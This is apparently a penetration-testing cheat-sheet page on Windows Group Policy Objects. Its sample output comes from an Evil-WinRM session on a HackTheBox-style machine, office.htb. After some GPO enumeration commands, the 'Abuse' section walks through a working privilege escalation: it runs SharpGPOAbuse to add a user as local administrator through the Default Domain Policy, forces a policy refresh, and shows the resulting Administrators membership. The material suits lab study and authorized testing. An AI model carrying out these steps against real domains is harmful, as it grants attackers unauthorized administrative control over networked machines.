---
title: "GPOs"
date: 2024-8-3
tags: ["GPOs", "Windows", "Group Policy Objects"]
---

### General

#### 1. Install GPMC \[Optional\]

```console
# Runas Administrator
Install-WindowsFeature GPMC
```

```console {class="sample-code"}
PS C:\Windows\system32> Install-WindowsFeature GPMC
Install-WindowsFeature GPMC

Success Restart Needed Exit Code      Feature Result                           
------- -------------- ---------      --------------                           
True    No             Success        {Group Policy Management}                
```

#### 2. List GPOs Name

```console
# List all GPOs
Get-GPO -All | Select-Object DisplayName
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\HHogan\Documents> Get-GPO -All | Select-Object DisplayName

DisplayName
-----------
Windows Firewall GPO
Default Domain Policy
Default Active Directory Settings GPO
Default Domain Controllers Policy
Windows Update GPO
Windows Update Domain Policy
Software Installation GPO
Password Policy GPO
```

```console
# Check GPO by name
Get-GPO -Name '<GPO_NAME>'
```

```console
# Generate XML report
Get-GPOReport -Name '<GPO_NAME>' -ReportType XML
```

```console
# Generate pretty HTML report
Get-GPOReport -Name '<GPO_NAME>' -ReportType HTML -Path "C:\ProgramData\GPOReport.html"
```

### Abuse #1: Add local admin

#### 1. Add localAdmin

```console
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount '<USER>' --GPOName '<GPO_NAME>'
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\HHogan\Documents> .\SharpGPOAbuse.exe --AddLocalADmin --UserAccount 'HHogan' --GPOName 'Default Domain Policy'
[+] Domain = office.htb
[+] Domain Controller = DC.office.htb
[+] Distinguished Name = CN=Policies,CN=System,DC=office,DC=htb
[+] SID Value of HHogan = S-1-5-21-1199398058-4196589450-691661856-1108
[+] GUID of "Default Domain Policy" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
[+] File exists: \\office.htb\SysVol\office.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
[+] The GPO does not specify any group memberships.
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
[+] Done!
```

#### 2. Force reload

```console
gpupdate /force
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\HHogan\Documents> gpupdate /force
Updating policy...

Computer Policy update has completed successfully.

User Policy update has completed successfully.

*Evil-WinRM* PS C:\Users\HHogan\Documents> net user HHogan
User name                    HHogan
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/6/2023 11:59:34 AM
Password expires             Never
Password changeable          5/7/2023 11:59:34 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   5/10/2023 5:30:58 AM

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Management Use
Global Group memberships     *Domain Users         *GPO Managers
The command completed successfully.
```

<small>*Ref: [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)*</small>
